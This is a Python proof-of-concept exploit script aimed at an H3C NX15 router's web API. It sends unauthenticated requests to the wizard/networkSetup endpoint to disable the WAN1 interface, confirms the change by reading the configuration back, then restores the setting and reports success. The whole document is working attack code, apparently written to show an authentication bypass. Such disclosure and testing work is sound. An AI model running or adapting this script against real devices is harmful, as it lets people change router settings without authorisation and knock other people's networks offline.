#!/usr/bin/env python3
import argparse
import json
import sys
import time

import requests


def post(base: str, path: str, body: dict):
    r = requests.post(base.rstrip('/') + path, json=body, timeout=15)
    r.raise_for_status()
    return r.json()


def main():
    ap = argparse.ArgumentParser(description='Unauthenticated wizard/networkSetup toggle PoC for H3C NX15')
    ap.add_argument('--base', default='http://192.168.8.1')
    ap.add_argument('--restore-mode', default='dhcp', choices=['dhcp', 'disabled'])
    args = ap.parse_args()

    base = args.base.rstrip('/')
    print(f'[*] target={base}')

    before = post(base, '/api/wizard/getNetworkConf', {})
    print('[*] before:')
    print(json.dumps(before, ensure_ascii=False, indent=2))

    payload = {'intf': 'WAN1', 'workMode': 'disabled'}
    print('[*] sending unauthenticated networkSetup -> disabled')
    resp = post(base, '/api/wizard/networkSetup', payload)
    print(json.dumps(resp, ensure_ascii=False, indent=2))

    time.sleep(1)
    after = post(base, '/api/wizard/getNetworkConf', {})
    print('[*] after disabled:')
    print(json.dumps(after, ensure_ascii=False, indent=2))

    restore = {'intf': 'WAN1', 'workMode': args.restore_mode}
    print(f'[*] restoring unauthenticated networkSetup -> {args.restore_mode}')
    resp2 = post(base, '/api/wizard/networkSetup', restore)
    print(json.dumps(resp2, ensure_ascii=False, indent=2))

    time.sleep(1)
    final = post(base, '/api/wizard/getNetworkConf', {})
    print('[*] final:')
    print(json.dumps(final, ensure_ascii=False, indent=2))

    if after.get('data', {}).get('workMode') != 'disabled':
        print('[!] warning: disabled state not observed in readback')
        return 2
    print('[+] SUCCESS: unauthenticated WAN mode change confirmed')
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
